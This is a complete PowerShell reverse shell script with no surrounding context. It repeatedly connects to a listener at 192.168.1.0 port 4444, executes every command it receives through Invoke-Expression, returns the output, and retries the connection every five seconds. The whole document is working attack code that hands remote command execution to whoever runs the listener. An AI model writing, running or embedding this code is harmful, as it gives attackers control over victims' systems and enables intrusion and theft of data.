do {
    try {
        # Attempt to connect to the listener
        $client = New-Object System.Net.Sockets.TCPClient("192.168.1.0", 4444)
        if ($client.Connected) {
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            $reader = New-Object System.IO.StreamReader($stream)

            # Notify the server about the successful connection
            $writer.WriteLine("Reverse shell connection established.")
            
            # Process commands from the server
            while ($true) {
                try {
                    # Wait for a command from the server
                    $command = $reader.ReadLine()
                    if ($command -eq $null) {
                        break # Exit the loop if the connection is closed
                    }

                    if ($command.Trim().ToLower() -eq "exit") {
                        $writer.WriteLine("Target script terminated.")
                        $client.Close()
                        exit # Completely terminate the script
                    }

                    # Execute the command and capture output
                    $output = try {
                        Invoke-Expression $command | Out-String
                    } catch {
                        "Error executing command: $_"
                    }

                    # Send the command's output back to the server
                    $writer.WriteLine($output)
                } catch {
                    # Handle any issues while processing commands
                    break
                }
            }

            # Clean up after disconnection
            $client.Close()
        }
    } catch {
        # Handle connection attempt errors
        Start-Sleep -Seconds 5
    }

    # Reattempt connection after a delay
    Start-Sleep -Seconds 5
} while ($true)
